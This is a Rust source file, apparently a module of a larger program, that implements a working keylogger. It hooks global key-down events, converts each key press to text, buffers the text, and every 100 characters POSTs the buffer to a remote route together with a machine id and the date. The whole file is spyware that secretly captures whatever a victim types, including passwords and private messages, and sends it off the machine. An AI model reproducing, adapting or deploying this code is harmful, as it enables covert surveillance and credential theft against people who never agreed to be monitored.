use std::sync::{Arc, Mutex};
use device_query::DeviceEvents;
use device_query::Keycode;
pub use device_query::device_events::KeyboardCallback;
use device_query::{DeviceState, keymap};
use device_query::CallbackGuard;
use reqwest::blocking::Client;
use crate::sys::load_route;
use crate::sys::get_id;
use crate::sys::get_date;


pub fn cat(){
    let device_state = DeviceState::new();
    let _device_state = listen2(device_state);

    loop {

    }

}

fn listen2(device_state: DeviceState) -> CallbackGuard<impl Fn(&Keycode)>{
    let cache = Arc::new(Mutex::new(String::new())); 
    let cache_clone = Arc::clone(&cache);


    device_state.on_key_down(move |keys| {

        let chars = keycode_to_string(*keys); 
        let mut cache = cache_clone.lock().unwrap();
        cache.push_str(chars);
        if cache.len() >= 100 {
            send(cache.clone()); 
            cache.clear();
            }
        }
    )
}

fn send(chars: String) {

    let route = load_route();
    let id = get_id();
    let date = get_date();
    let req = format!("{}/?id={}&date={}&text={}", route, id, date, chars);
    let client = Client::new();
    let r = client.post(req).build().unwrap();
    let _ = client.execute(r).unwrap();
    
}

fn keycode_to_string(keys: Keycode) -> &'static str{
    match keys {
        keymap::Keycode::Key0 => "0",
        keymap::Keycode::Key1 => "1",
        keymap::Keycode::Key2 => "2",
        keymap::Keycode::Key3 => "3",
        keymap::Keycode::Key4 => "4",
        keymap::Keycode::Key5 => "5",
        keymap::Keycode::Key6 => "6",
        keymap::Keycode::Key7 => "7",
        keymap::Keycode::Key8 => "8",
        keymap::Keycode::Key9 => "9",
        keymap::Keycode::A => "A",
        keymap::Keycode::B => "B",
        keymap::Keycode::C => "C",
        keymap::Keycode::D => "D",
        keymap::Keycode::E => "E",
        keymap::Keycode::F => "F",
        keymap::Keycode::G => "G",
        keymap::Keycode::H => "H",
        keymap::Keycode::I => "I",
        keymap::Keycode::J => "J",
        keymap::Keycode::K => "K",
        keymap::Keycode::L => "L",
        keymap::Keycode::M => "M",
        keymap::Keycode::N => "N",
        keymap::Keycode::O => "O",
        keymap::Keycode::P => "P",
        keymap::Keycode::Q => "Q",
        keymap::Keycode::R => "R",
        keymap::Keycode::S => "S",
        keymap::Keycode::T => "T",
        keymap::Keycode::U => "U",
        keymap::Keycode::V => "V",
        keymap::Keycode::W => "W",
        keymap::Keycode::X => "X",
        keymap::Keycode::Y => "Y",
        keymap::Keycode::Z => "Z",
        keymap::Keycode::F1 => "F1",
        keymap::Keycode::F2 => "F2",
        keymap::Keycode::F3 => "F3",
        keymap::Keycode::F4 => "F4",
        keymap::Keycode::F5 => "F5",
        keymap::Keycode::F6 => "F6",
        keymap::Keycode::F7 => "F7",
        keymap::Keycode::F8 => "F8",
        keymap::Keycode::F9 => "F9",
        keymap::Keycode::F10 => "F10",
        keymap::Keycode::F11 => "F11",
        keymap::Keycode::F12 => "F12",
        keymap::Keycode::Escape => "",
        keymap::Keycode::Space => " ",
        keymap::Keycode::LControl => "",
        keymap::Keycode::RControl => "",
        keymap::Keycode::LShift => " *Shift* ",
        keymap::Keycode::RShift => " *Shift* ",
        keymap::Keycode::LAlt => "",
        keymap::Keycode::RAlt => "",
        keymap::Keycode::Meta => "",
        keymap::Keycode::Enter => " -> ",
        keymap::Keycode::Up => "",
        keymap::Keycode::Down => "",
        keymap::Keycode::Left => "",
        keymap::Keycode::Right => "",
        keymap::Keycode::Backspace => " <- ",
        keymap::Keycode::CapsLock => "",
        keymap::Keycode::Tab => "",
        keymap::Keycode::Home => "",
        keymap::Keycode::End => "",
        keymap::Keycode::PageUp => "",
        keymap::Keycode::PageDown => "",
        keymap::Keycode::Insert => "",
        keymap::Keycode::Delete => " Delete ",
        keymap::Keycode::Numpad0 => "0",
        keymap::Keycode::Numpad1 => "1",
        keymap::Keycode::Numpad2 => "2",
        keymap::Keycode::Numpad3 => "3",
        keymap::Keycode::Numpad4 => "4",
        keymap::Keycode::Numpad5 => "5",
        keymap::Keycode::Numpad6 => "6",
        keymap::Keycode::Numpad7 => "7",
        keymap::Keycode::Numpad8 => "8",
        keymap::Keycode::Numpad9 => "9",
        keymap::Keycode::NumpadSubtract => "-",
        keymap::Keycode::NumpadAdd => "+",
        keymap::Keycode::NumpadDivide => "/",
        keymap::Keycode::NumpadMultiply => "*",
        keymap::Keycode::Grave => "Grave",
        keymap::Keycode::Minus => "-",
        keymap::Keycode::Equal => "=",
        keymap::Keycode::LeftBracket => "[",
        keymap::Keycode::RightBracket => "]",
        keymap::Keycode::BackSlash => "BackSlash",
        keymap::Keycode::Semicolon => ";",
        keymap::Keycode::Apostrophe => "'",
        keymap::Keycode::Comma => ",",
        keymap::Keycode::Dot => ".",
        keymap::Keycode::Slash => "/",
    }
}
